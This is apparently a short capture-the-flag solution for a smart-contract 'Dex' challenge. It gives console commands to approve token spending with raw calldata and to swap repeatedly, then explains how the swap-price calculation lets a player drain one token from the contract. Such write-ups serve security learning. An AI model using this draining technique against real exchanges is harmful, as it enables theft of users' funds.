# In the Console

Approve contract to spend tokens: `await contract.approve(contract.address, approvalAmount)` (not working in metamask)

`sendTransaction({from:player, to:await contract.token1(), data:"0x095ea7b30000000000000000000000006666300839bD5aE87E09122D6715071AcE9112B80000000000000000000000000000000000000000000010000000000000000000"})`

`sendTransaction({from:player, to:await contract.token2(), data:"0x095ea7b30000000000000000000000006666300839bD5aE87E09122D6715071AcE9112B80000000000000000000000000000000000000000000010000000000000000000"})`

Swap max tokens: `await contract.swap(await contract.token1(), maxAmount)`

## Why?

It's possible to take advantange of the Dex's way of calculating the swap amount. By raising the disrepancy between the contract balance of both tokens, we can obtain more tokens when swapping. Thus, we keep swapping until we can calculate an exact amount to swap to drain the contract of one of the tokens balance.
